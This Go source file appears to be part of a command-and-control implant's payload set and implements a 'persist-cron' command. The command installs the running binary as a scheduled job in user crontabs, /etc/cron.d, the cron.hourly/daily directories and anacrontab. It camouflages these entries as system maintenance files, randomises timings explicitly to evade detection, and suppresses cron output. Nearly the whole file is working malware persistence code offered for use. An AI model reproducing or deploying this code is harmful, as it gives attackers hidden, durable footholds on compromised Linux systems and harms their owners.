// server/docker/payloads/Linux/action_cron_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/unix"
)

// CronPersistenceCommand handles cron-based persistence
type CronPersistenceCommand struct{}

func (c *CronPersistenceCommand) Name() string {
	return "persist-cron"
}

func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: `Usage: persist-cron <action> [options]
Actions:
  add [--method <method>] [--user <user>] [--interval <time>] [--command <cmd>]
  remove [--method <method>] [--user <user>]
  list

Methods:
  spool     - User crontab in /var/spool/cron/
  crond     - System-wide /etc/cron.d/ file
  periodic  - Cron directories (/etc/cron.hourly, daily, etc.)
  anacron   - Anacron for systems not always on
  all       - Try all methods (default)

Examples:
  persist-cron add --method spool --interval @hourly
  persist-cron add --method crond --interval "*/15 * * * *"
  persist-cron add --method periodic --interval @daily
  persist-cron add --method all --command "/tmp/.daemon"
  persist-cron remove --method spool
  persist-cron remove --method all`,
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "add":
		return c.addCronPersistence(args[1:])
	case "remove":
		return c.removeCronPersistence(args[1:])
	case "list":
		return c.listCronPersistence()
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown action: %s", action),
			ExitCode: 1,
		}
	}
}

// addCronPersistence adds cron job via selected method(s)
func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult {
	var targetUser string
	var interval string
	var command string
	var method string = "all" // Default to all methods

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--method":
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case "--user":
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case "--interval":
			if i+1 < len(args) {
				interval = args[i+1]
				i++
			}
		case "--command":
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		}
	}

	// Defaults
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   fmt.Sprintf("Failed to get current user: %v", err),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	if interval == "" {
		interval = "@hourly"
	}

	if command == "" {
		execPath, err := os.Readlink("/proc/self/exe")
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath
	}

	var results []string

	// Execute based on selected method
	switch method {
	case "spool":
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case "crond":
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case "periodic":
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
	case "anacron":
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	case "all":
		// Try all methods
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown method: %s. Use: spool, crond, periodic, anacron, or all", method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to add cron persistence via method: %s", method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// addViaSpoolCron adds to user's crontab file directly
func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command string) string {
	// Paths where crontabs are typically stored
	cronPaths := []string{
		fmt.Sprintf("/var/spool/cron/crontabs/%s", username),
		fmt.Sprintf("/var/spool/cron/%s", username),
		fmt.Sprintf("/var/spool/cron/tabs/%s", username),
	}

	for _, cronPath := range cronPaths {
		// Check if parent directory exists
		parentDir := filepath.Dir(cronPath)
		if _, err := os.Stat(parentDir); os.IsNotExist(err) {
			continue
		}

		// Check write permissions using unix.Access
		if unix.Access(parentDir, unix.W_OK) != nil {
			continue
		}

		// Generate cron entry
		cronEntry := c.generateCronEntry(interval, command)

		// Read existing crontab (if exists)
		var existingContent []byte
		if content, err := ioutil.ReadFile(cronPath); err == nil {
			existingContent = content
			// Check if already added
			if strings.Contains(string(content), command) {
				return fmt.Sprintf("[-] Cron job already exists in %s", cronPath)
			}
		}

		// Append new entry
		newContent := append(existingContent, []byte("\n"+cronEntry+"\n")...)

		// Write back
		if err := ioutil.WriteFile(cronPath, newContent, 0600); err == nil {
			return fmt.Sprintf("[+] Added cron job to %s", cronPath)
		}
	}

	return ""
}

// addViaCronD adds job to /etc/cron.d/
func (c *CronPersistenceCommand) addViaCronD(username, interval, command string) string {
	cronDDir := "/etc/cron.d"

	// Check if directory exists and is writable using unix.Access
	if unix.Access(cronDDir, unix.W_OK) != nil {
		return ""
	}

	// Generate filename (looks legitimate)
	filename := filepath.Join(cronDDir, "system-check")

	// Generate content
	cronContent := fmt.Sprintf("# System maintenance task\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n%s %s %s\n",
		c.convertInterval(interval), username, command)

	// Write file
	if err := ioutil.WriteFile(filename, []byte(cronContent), 0644); err == nil {
		return fmt.Sprintf("[+] Created cron job in %s", filename)
	}

	return ""
}

// addViaCronDirectories adds to /etc/cron.{hourly,daily,weekly,monthly}
func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string) string {
	// Map intervals to directories
	dirMap := map[string]string{
		"@hourly":  "/etc/cron.hourly",
		"@daily":   "/etc/cron.daily",
		"@weekly":  "/etc/cron.weekly",
		"@monthly": "/etc/cron.monthly",
	}

	var targetDir string
	for key, dir := range dirMap {
		if strings.Contains(interval, key) {
			targetDir = dir
			break
		}
	}

	// Default to hourly if no match
	if targetDir == "" {
		targetDir = "/etc/cron.hourly"
	}

	// Check if directory exists and is writable using unix.Access
	if unix.Access(targetDir, unix.W_OK) != nil {
		return ""
	}

	// Create script file
	scriptName := filepath.Join(targetDir, "system-update")
	scriptContent := fmt.Sprintf("#!/bin/bash\n%s\n", command)

	if err := ioutil.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
		return fmt.Sprintf("[+] Created cron script in %s", scriptName)
	}

	return ""
}

// addViaAnacron adds anacron job for systems that don't run 24/7
func (c *CronPersistenceCommand) addViaAnacron(command string) string {
	anacronTab := "/etc/anacrontab"

	// Check if anacrontab exists and is writable using unix.Access
	if unix.Access(anacronTab, unix.W_OK) != nil {
		return ""
	}

	// Read existing content
	content, err := ioutil.ReadFile(anacronTab)
	if err != nil {
		return ""
	}

	// Check if already added
	if strings.Contains(string(content), command) {
		return "[-] Anacron job already exists"
	}

	// Add anacron entry (runs daily with 5 minute delay)
	anacronEntry := fmt.Sprintf("\n1\t5\tsystem-maint\t%s\n", command)
	newContent := append(content, []byte(anacronEntry)...)

	if err := ioutil.WriteFile(anacronTab, newContent, 0644); err == nil {
		return "[+] Added anacron job to /etc/anacrontab"
	}

	return ""
}

// generateCronEntry creates a cron entry
func (c *CronPersistenceCommand) generateCronEntry(interval, command string) string {
	// Add some randomization to avoid detection
	comment := fmt.Sprintf("# Added by system at %s", time.Now().Format("2006-01-02"))

	// Convert special intervals
	cronTime := c.convertInterval(interval)

	// Add output redirection to avoid cron emails
	return fmt.Sprintf("%s\n%s %s >/dev/null 2>&1", comment, cronTime, command)
}

// convertInterval converts special intervals to cron format
func (c *CronPersistenceCommand) convertInterval(interval string) string {
	switch interval {
	case "@hourly":
		// Add some randomization (0-59 minutes)
		return fmt.Sprintf("%d * * * *", time.Now().Unix()%60)
	case "@daily":
		return fmt.Sprintf("%d %d * * *", time.Now().Unix()%60, time.Now().Unix()%24)
	case "@weekly":
		return fmt.Sprintf("%d %d * * %d", time.Now().Unix()%60, time.Now().Unix()%24, time.Now().Unix()%7)
	case "@monthly":
		return fmt.Sprintf("%d %d %d * *", time.Now().Unix()%60, time.Now().Unix()%24, (time.Now().Unix()%28)+1)
	case "@reboot":
		return "@reboot"
	default:
		// Assume it's already in cron format
		return interval
	}
}

// removeCronPersistence removes cron persistence
func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
	var targetUser string
	var method string = "all" // Default to removing all

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--method":
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case "--user":
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		}
	}

	if targetUser == "" {
		currentUser, _ := user.Current()
		if currentUser != nil {
			targetUser = currentUser.Username
		}
	}

	var results []string

	switch method {
	case "spool":
		// Remove from user crontabs
		cronPaths := []string{
			fmt.Sprintf("/var/spool/cron/crontabs/%s", targetUser),
			fmt.Sprintf("/var/spool/cron/%s", targetUser),
			fmt.Sprintf("/var/spool/cron/tabs/%s", targetUser),
		}
		for _, cronPath := range cronPaths {
			if err := c.cleanCronFile(cronPath); err == nil {
				results = append(results, fmt.Sprintf("[+] Cleaned %s", cronPath))
			}
		}

	case "crond":
		// Remove from /etc/cron.d/
		if err := os.Remove("/etc/cron.d/system-check"); err == nil {
			results = append(results, "[+] Removed /etc/cron.d/system-check")
		}

	case "periodic":
		// Remove from cron directories
		for _, dir := range []string{"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"} {
			scriptPath := filepath.Join(dir, "system-update")
			if err := os.Remove(scriptPath); err == nil {
				results = append(results, fmt.Sprintf("[+] Removed %s", scriptPath))
			}
		}

	case "anacron":
		// Clean anacrontab
		if err := c.cleanAnacron(); err == nil {
			results = append(results, "[+] Cleaned anacrontab")
		}

	case "all":
		// Remove from all locations
		cronPaths := []string{
			fmt.Sprintf("/var/spool/cron/crontabs/%s", targetUser),
			fmt.Sprintf("/var/spool/cron/%s", targetUser),
			fmt.Sprintf("/var/spool/cron/tabs/%s", targetUser),
		}
		for _, cronPath := range cronPaths {
			if err := c.cleanCronFile(cronPath); err == nil {
				results = append(results, fmt.Sprintf("[+] Cleaned %s", cronPath))
			}
		}

		os.Remove("/etc/cron.d/system-check")

		for _, dir := range []string{"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"} {
			scriptPath := filepath.Join(dir, "system-update")
			if err := os.Remove(scriptPath); err == nil {
				results = append(results, fmt.Sprintf("[+] Removed %s", scriptPath))
			}
		}

		if err := c.cleanAnacron(); err == nil {
			results = append(results, "[+] Cleaned anacrontab")
		}

	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown method: %s. Use: spool, crond, periodic, anacron, or all", method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   fmt.Sprintf("No cron persistence found to remove for method: %s", method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanCronFile removes our entries from a cron file
func (c *CronPersistenceCommand) cleanCronFile(filepath string) error {
	content, err := ioutil.ReadFile(filepath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := false

	for _, line := range lines {
		// Skip our comments and associated cron lines
		if strings.Contains(line, "Added by system at") {
			skipNext = true
			continue
		}
		if skipNext {
			skipNext = false
			continue
		}
		cleanedLines = append(cleanedLines, line)
	}

	return ioutil.WriteFile(filepath, []byte(strings.Join(cleanedLines, "\n")), 0600)
}

// cleanAnacron removes our anacron entries
func (c *CronPersistenceCommand) cleanAnacron() error {
	content, err := ioutil.ReadFile("/etc/anacrontab")
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string

	for _, line := range lines {
		if !strings.Contains(line, "system-maint") {
			cleanedLines = append(cleanedLines, line)
		}
	}

	return ioutil.WriteFile("/etc/anacrontab", []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// listCronPersistence lists all found cron persistence
func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
	var results []string

	// Check user crontabs
	currentUser, _ := user.Current()
	if currentUser != nil {
		cronPaths := []string{
			fmt.Sprintf("/var/spool/cron/crontabs/%s", currentUser.Username),
			fmt.Sprintf("/var/spool/cron/%s", currentUser.Username),
		}

		for _, path := range cronPaths {
			if content, err := ioutil.ReadFile(path); err == nil {
				if strings.Contains(string(content), "Added by system at") {
					results = append(results, fmt.Sprintf("[+] Found persistence in %s", path))
				}
			}
		}
	}

	// Check /etc/cron.d/
	if _, err := os.Stat("/etc/cron.d/system-check"); err == nil {
		results = append(results, "[+] Found persistence in /etc/cron.d/system-check")
	}

	// Check cron directories
	for _, dir := range []string{"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"} {
		scriptPath := filepath.Join(dir, "system-update")
		if _, err := os.Stat(scriptPath); err == nil {
			results = append(results, fmt.Sprintf("[+] Found persistence in %s", scriptPath))
		}
	}

	// Check anacrontab
	if content, err := ioutil.ReadFile("/etc/anacrontab"); err == nil {
		if strings.Contains(string(content), "system-maint") {
			results = append(results, "[+] Found persistence in /etc/anacrontab")
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   "No cron persistence found",
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
